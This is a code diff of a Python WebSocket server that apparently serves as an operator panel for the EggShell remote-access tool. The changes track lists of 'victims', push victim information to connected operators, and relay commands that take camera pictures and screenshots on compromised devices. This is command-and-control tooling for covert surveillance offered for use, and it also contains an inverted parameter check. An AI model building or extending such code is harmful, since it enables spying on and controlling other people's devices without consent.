@@ -17,7 +17,9 @@ class WsServer:
         self.port = 5000
         self.buffer_size = 1024
         self.eggshell = eggshell
+        self.conn_poll = []   # connection pool for server to send update info
         self.ready = False
+        self.command_list = ['execution', 'fetch', 'exit']
 
     def recv_data(self, conn):  # 服务器解析浏览器发送的信息
         try:
@@ -98,101 +100,158 @@ class WsServer:
         else:
             str_handshake = str_handshake.replace('{3}', "WsServer")
 
-
         conn.send(str_handshake)  # 发送建立连接的信息
         print ('%s : Socket handshaken with %s:%s success' % (thread_name, address[0], address[1]))
         print ('Start transmitting data...')
         print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
         return True
 
+    # Handle Client Request
     def handle_request(self, conn, address, thread_name):
         self.handshake(conn, address, thread_name)  # 握手
         conn.setblocking(0)  # 设置socket为非阻塞
         self.ready = True
+        self.conn_poll.append(conn)
+        self.update_victim_info(conn)
 
         while True:
-            clientdata = self.recv_data(conn)
+            client_data = self.recv_data(conn)
             response = {}
-            if clientdata:
+            if client_data:
                 try:
-                    raw_cmd = json.loads(clientdata.decode())
-                    id = raw_cmd['id']
-                    cmd = raw_cmd['cmd']
-                    para = raw_cmd['para']
+                    raw_cmd = json.loads(client_data.decode())
+                    command = raw_cmd['command']
+                    if 'victims_type' in raw_cmd:
+                        victims_type = raw_cmd['victims_type']
+                    else:
+                        victims_type = None
+                    if 'content' in raw_cmd:
+                        content = raw_cmd['content']
+                    else:
+                        content = None
                 except:
                     response["status"] = "Fail"
-                    response["content_type"] = ""
-                    response["content"] = ""
+                    response["content_type"] = "text"
+                    response["content"] = "Invalid Request"
                     self.send_data(conn, json.dumps(response))
                     continue
-                if not para:
-                    cmd_data = cmd + ' ' + para
-                else:
-                    cmd_data = cmd
-                if cmd == 'exit':
-                    break
-                elif cmd == "fetch":
-                    self.update_info(conn)
-                elif cmd == 'picture':
-                    filename = self.eggshell.server.multihandler.interact(id, cmd_data)
-                    if filename:
-                        response["status"] = "Success"
-                        response["content_type"] = "file"
-                        response["content"] = filename
-                        self.send_data(conn, json.dumps(response))
-                    else:
-                        response["status"] = "Fail"
-                        response["content_type"] = ""
-                        response["content"] = ""
-                        self.send_data(conn, json.dumps(response))
-#                   conn.send(b'picture')
-                    print(id, cmd, para)
-                elif cmd == 'screenshot':
-                    filename = self.eggshell.server.multihandler.interact(id, cmd_data)
-                    if filename:
-                        response["status"] = "Success"
-                        response["content_type"] = "file"
-                        response["content"] = filename
-                        self.send_data(conn, json.dumps(response))
-                    else:
-                        response["status"] = "Fail"
-                        response["content_type"] = ""
-                        response["content"] = ""
-                        self.send_data(conn, json.dumps(response))
-#                   conn.send(b'screenshot')
-                    print(id, cmd, para)
-                else:
+
+                if command not in self.command_list:
                     response["status"] = "Fail"
-                    response["content_type"] = ""
-                    response["content"] = ""
+                    response["content_type"] = "text"
+                    response["content"] = "Invalid Command or Type"
                     self.send_data(conn, json.dumps(response))
-        conn.sendall(b'bye')
+                    continue
+
+                if command == 'exit':
+                    break
+                elif command == 'fetch':
+                    if not victims_type:
+                        victims_type = 'victims'
+                    if victims_type == 'victims':
+                        self.update_victim_info(conn)
+                    elif victims_type == 'identified victims':
+                        self.update_identified_victim(conn)
+                elif command == 'execution':
+                    if not content:
+                        response["status"] = "Fail"
+                        response["content_type"] = "text"
+                        response["content"] = "Invalid Action Command"
+                    response = self.run_command(content)
+                    self.send_data(conn, json.dumps(response))
+
+        conn.sendall(b'End Connection')
+        self.conn_poll.remove(conn)
         conn.close()
 
 
-    def push_data(self, conn, address, thread_name):
+### Server Functions
+
+    # Execute command from clients' request
+    def run_command(self, content):
+        response = {}
+
+        if not content:
+            response["status"] = "Fail"
+            response["content_type"] = "text"
+            response["content"] = "Invalid Content"
+            return response
+
         try:
-            self.update_info(conn)
+            session_id = content['session_id']
+            action = content['action']
+            para = content['para']
+        except:
+            response["status"] = "Fail"
+            response["content_type"] = "text"
+            response["content"] = "Invalid Content Format"
+            return response
+
+        if not para:
+            cmd_data = action + ' ' + para
+        else:
+            cmd_data = action
+
+        if action == 'picture':
+            filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
+            if filename:
+                response["status"] = "Success"
+                response["content_type"] = "text"
+                response["content"] = filename
+            else:
+                response["status"] = "Fail"
+                response["content_type"] = "text"
+                response["content"] = "Error in Execution"
+        elif action == 'screenshot':
+            filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
+            if filename:
+                response["status"] = "Success"
+                response["content_type"] = "text"
+                response["content"] = filename
+            else:
+                response["status"] = "Fail"
+                response["content_type"] = "text"
+                response["content"] = "Error in Execution"
+        else:
+            response["status"] = "Fail"
+            response["content_type"] = "text"
+            response["content"] = "Invalid Action"
+        return response
+
+    # Auto push victims' info when the victims' info is modified in server
+    def push_data(self):
+        try:
+            # Send victims' info to all connections
             while True:
                 if self.eggshell.server.multihandler.victims_modify:
-                    self.update_info(conn)
+                    for conn in self.conn_poll:
+                        self.update_victim_info(conn)
+                    self.eggshell.server.multihandler.victims_modify = False
                 else:
                     time.sleep(3)
         except:
-            print ("End connection")
+            print ("End connection for update error")
             return
 
-
-    def update_info(self, conn):
+    # Update victims' info to connection
+    def update_victim_info(self, conn):
         victims = self.eggshell.server.multihandler.victims
         response = {}
         response["status"] = "Success"
         response["content_type"] = "json"
         response["content"] = victims
         self.send_data(conn, json.dumps(response))
-        self.eggshell.server.multihandler.victims_modify = False
 
+    # Update identified victims' info to connection
+    def update_identified_victim(self, conn):
+        identified_victim = self.eggshell.server.multihandler.identified_victims
+        response = {}
+        response["status"] = "Success"
+        response["content_type"] = "json"
+        response["content"] = identified_victim
+        self.send_data(conn, json.dumps(response))
 
+    # WsServer Main Function, accept connections
     def ws_service(self):
 
         index = 1
@@ -200,18 +259,26 @@ class WsServer:
         sock.bind((self.host, self.port))
         sock.listen(10)
 
-        print ('\r\n\r\nWebsocket server start, wait for connect!')
+        print ('\r\nWebsocket server start, wait for connect!')
+        print ('\r\nServer Push thread start!')
+        t_push = threading.Thread(target=self.push_data)
+        t_push.start()
+
         print ('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -')
         while True:
-            connection, address = sock.accept()
-            thread_name = 'thread_%s' % index
-            print ('%s : Connection from %s:%s' % (thread_name, address[0], address[1]))
-            t_listen = threading.Thread(target=self.handle_request, args=(connection, address, thread_name))
-            t_listen.start()
-            time.sleep(2)
-            t_push = threading.Thread(target=self.push_data, args=(connection, address, thread_name))
-            t_push.start()
-            index += 1
+            try:
+                connection, address = sock.accept()
+                thread_name = 'thread_%s' % index
+                print ('%s : Connection from %s:%s' % (thread_name, address[0], address[1]))
+                t_listen = threading.Thread(target=self.handle_request, args=(connection, address, thread_name))
+                t_listen.start()
+                index += 1
+            except KeyboardInterrupt:
+                print('Close the Application')
+                exit()
+            except:
+                print('Error: close the Application')
+                exit()
 
 
 if __name__ == "__main__":
